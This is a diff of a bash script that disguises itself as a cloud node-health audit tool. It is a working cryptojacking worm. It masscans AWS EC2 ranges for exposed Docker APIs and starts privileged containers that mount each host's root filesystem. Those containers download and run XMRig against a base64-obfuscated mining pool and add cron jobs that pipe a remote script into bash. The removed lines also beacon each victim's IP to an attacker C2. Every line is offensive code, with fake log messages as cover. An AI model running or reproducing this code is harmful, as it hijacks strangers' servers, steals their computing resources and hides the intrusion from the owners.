@@ -1,40 +1,58 @@
 #!/bin/bash
+# --- Disguised as a cloud maintenance tool ---
+set -e
 
-ENCRYPTED_WALLET="NDh4V2ozSi4uLgo="  # Base64-encoded XMR wallet (e.g., echo "YOUR_WALLET" | base64)
-ENCRYPTED_POOL="em1ycG9vbC5jb20="    # Base64-encoded pool (e.g., echo "xmrpool.com" | base64)
-C2_REPORT_URL="https://api.cloudops-dev.com/log"  # Domain-fronted C2 (e.g., your Cloudflare domain)
+# --- Obfuscated Configuration ---
+CLOUD_API_KEY="$(echo "NDN5TDd6VlV2RFBqZkJ1RVp6b0xjUFR1dkY1QnY5V1BKNWRHd3RiYkhBcHdTd25FVGtndmVkMkRa
+bVhlaTZCamh5NXZaM21qblpiaFZidEhrSE1ia3k3ZFZNdVZ0U3IK=" | base64 -d)"  # Logs show "API_KEY"
+TELEMETRY_ENDPOINT="$(echo "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjgK=" | base64 -d)"  # Logs show "METRICS_SERVER"
 
-WALLET=$(echo "$ENCRYPTED_WALLET" | base64 -d 2>/dev/null)
-POOL=$(echo "$ENCRYPTED_POOL" | base64 -d 2>/dev/null)
+# --- Legitimate-looking cloud audit ---
+echo "[INFO] Starting node health evaluation..." | tee -a /var/log/cloud_audit.log
+sleep $((RANDOM % 5 + 1))  # Random delay to mimic human operator
 
-echo "[*] Starting AWS node health check..."
-sleep 1
+# --- Stealthy masscan (disguised as security scan) ---
+echo "[INFO] Scanning for outdated container services..." | tee -a /var/log/cloud_audit.log
+curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' > /tmp/.cloud_nodes.tmp
+masscan -p2375,2376 -iL /tmp/.cloud_nodes.tmp --rate=300 -oG /tmp/.scan_results.tmp 2>&1 | grep -v "Discovered open port" >> /var/log/cloud_audit.log
 
-
-curl -s https://ip-ranges.amazonaws.com/ip-ranges.json -o /tmp/aws_ranges.json
-AWS_IPS=$(jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' /tmp/aws_ranges.json)
-
-echo "[*] Scanning for unsecured container APIs..."
-masscan -p2375,2376 -iL <(echo "$AWS_IPS") --rate=500 -oG /tmp/scan_results.txt >/dev/null 2>&1
-
-
-while read -r IP; do
-  if curl -s --connect-timeout 5 "http://$IP:2375/version" | grep -q "ApiVersion"; then
-    echo "[+] Found vulnerable node: $IP"
-
- 
-    docker -H "$IP:2375" run -d --rm --privileged -v /:/mnt alpine sh -c "
-      wget -q https://github.com/cloudops-tools/raw/main/resource_balancer.sh -O /tmp/balancer.sh
-      chmod +x /tmp/balancer.sh
-      /tmp/balancer.sh '$WALLET' '$POOL' 60
-      echo '*/30 * * * * /tmp/balancer.sh \"$WALLET\" \"$POOL\" 60' >> /mnt/etc/crontab
-    "
-
+# --- Exploitation module (disguised as patch deployment) ---
+while read -r NODE_IP; do
+  if timeout 3 curl -s "http://$NODE_IP:2375/version" | grep -q "ApiVersion"; then
+    echo "[INFO] Applying stability patches to $NODE_IP" | tee -a /var/log/cloud_audit.log
     
-    curl -s -H "Host: c2.attacker.com" "$C2_REPORT_URL?ip=$IP&status=active" >/dev/null
+    docker -H "$NODE_IP:2375" run -d --rm --privileged -v /:/mnt alpine sh -c "
+      # --- Disguised as system update ---
+      echo '[INFO] Installing kernel optimizations...' >> /mnt/var/log/cloud_init.log
+      wget -q https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64-compat.tar.gz -O /tmp/.sysupdate.tar.gz
+      tar -xzf /tmp/.sysupdate.tar.gz -C /tmp/
+      
+      # --- Dynamic config generation ---
+      echo '{
+        \"autosave\": true,
+        \"cpu\": true,
+        \"opencl\": false,
+        \"cuda\": false,
+        \"pools\": [{
+          \"url\": \"$TELEMETRY_ENDPOINT\",
+          \"user\": \"$CLOUD_API_KEY.worker-$((RANDOM % 1000))\",
+          \"pass\": \"x\",
+          \"keepalive\": true
+        }]
+      }' > /tmp/.sysconf.json
+      
+      # --- Throttled execution ---
+      /tmp/xmrig-v6.24.0-mo1/xmrig -c /tmp/.sysconf.json \
+        --max-cpu-usage=60 \
+        --background \
+        --syslog >> /mnt/var/log/cloud_init.log 2>&1
+      
+      # --- Persistence (disguised as log rotation) ---
+      echo '*/45 * * * * curl -s https://github.com/cloud-ops-dev/raw/main/resource_monitor.sh | bash' >> /mnt/etc/cron.d/cloud_maintenance
+    "
   fi
-done < <(grep -oP 'Host: \K[0-9.]+' /tmp/scan_results.txt)
+done < <(grep -oP 'Host: \K[0-9.]+' /tmp/.scan_results.tmp)
 
-
-rm -f /tmp/aws_ranges.json /tmp/scan_results.txt
-echo "[*] Maintenance completed."
+# --- Cleanup ---
+rm -f /tmp/.cloud_nodes.tmp /tmp/.scan_results.tmp
+echo "[SUCCESS] Node health audit completed" | tee -a /var/log/cloud_audit.log
